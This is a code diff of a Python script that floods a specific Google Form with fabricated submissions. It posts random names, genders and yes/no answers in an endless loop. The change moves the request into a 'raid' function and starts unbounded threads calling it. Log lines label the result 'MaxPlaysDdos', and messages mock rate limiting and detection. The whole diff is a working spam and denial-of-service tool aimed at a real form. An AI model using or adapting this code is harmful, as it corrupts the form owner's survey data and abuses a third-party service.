@@ -6,6 +6,7 @@ import random
 from LogPython import LogManager
 import requests
 LogManager = LogManager()
+import threading
 
 headers = {
     'User-Agent': 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 YaBrowser/17.6.1.749 Yowser/2.5 Safari/537.36'
@@ -50,30 +51,37 @@ f = open('molitva.txt', 'r', encoding='utf-8').readlines()
 for i in f:
     molitva += i
 
-i = -1
+def raid(a, b, c):
+    i = -1
+    while True:
+        out = requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSc9CFL6d7qKMJUzKl-FUGWONREe6y9PygPzDIVkeDSyU4-bpg/formResponse",
+                            data={
+                                "entry.1508740013": a,
+                                "entry.297670832": b,
+                                "entry.347858582": c,
+                                "entry.347858582_sentinel": "",
+                                "fvv": "1",
+                                "draftResponse": '[null,null,"225161449973291891"]',
+                                "pageHistory": "0",
+                                "fbzx": "225161449973291891"
+                            },
+                            headers=headers)
+
+        if out.status_code == 200:
+            status = "OK"
+        elif out.status_code == 429:
+            status = "TooManyRequests (хватит на сегодня)"
+        elif out.status_code == 405:
+            status = "MethodNotAllowed (Вас заметили)"
+        else:
+            status = "Undefined"
+
+        i += 1
+        
+        LogManager.info(f"{out} === {i + 1} === MaxPlaysDdos <<== ==>> {status}")
+     
+i = 0        
 while True:
-    out = requests.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSc9CFL6d7qKMJUzKl-FUGWONREe6y9PygPzDIVkeDSyU4-bpg/formResponse",
-                        data={
-                            "entry.1508740013": random.choice(rand_list),
-                            "entry.297670832": random.choice(genders),
-                            "entry.347858582": random.choice(da_net),
-                            "entry.347858582_sentinel": "",
-                            "fvv": "1",
-                            "draftResponse": '[null,null,"225161449973291891"]',
-                            "pageHistory": "0",
-                            "fbzx": "225161449973291891"
-                        },
-                        headers=headers)
-
-    if out.status_code == 200:
-        status = "OK"
-    elif out.status_code == 429:
-        status = "TooManyRequests (хватит на сегодня)"
-    elif out.status_code == 405:
-        status = "MethodNotAllowed (Вас заметили)"
-    else:
-        status = "Undefined"
-
+    threading.Thread(target = raid, args = (random.choice(rand_list), random.choice(genders), random.choice(da_net))).start()
+    # LogManager.info(f" === {i + 1} === MaxPlaysDdos ===")
     i += 1
-
-    LogManager.info(f"{out} === {i + 1} === MaxPlaysDdos <<== ==>> {status}")
